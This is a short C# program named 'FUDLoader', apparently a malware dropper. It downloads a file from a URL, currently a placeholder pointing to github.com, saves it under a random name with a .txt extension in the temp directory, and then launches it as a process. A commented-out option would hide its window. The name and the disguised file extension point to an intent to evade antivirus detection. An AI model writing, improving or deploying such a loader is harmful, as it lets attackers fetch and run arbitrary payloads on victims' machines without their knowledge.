using System;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Diagnostics;

namespace FUDLoader
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string url = "https://github.com/";
            string FileLocate = FileName();

            FileName();
            Download(FileLocate, url);
            Runprocess(FileLocate);
        }

        private static void Download(string FileLocate, string url)
        {
            WebClient client = new WebClient();

            client.DownloadFile(new Uri(url), FileLocate + ".txt");
        }

        private static string FileName()
        {
            string Temp = Path.GetTempPath();
            string Ran = Path.GetRandomFileName();
            string FileLocate = Temp + Ran;

            return FileLocate;
        }

        private static void Runprocess(string FileLocate)
        {
            Process process = new Process
            {
                StartInfo =
                {
                    FileName = FileLocate + ".txt",
                    //WindowStyle = ProcessWindowStyle.Hidden
                }
            };

            process.Start();
        }
    }
}
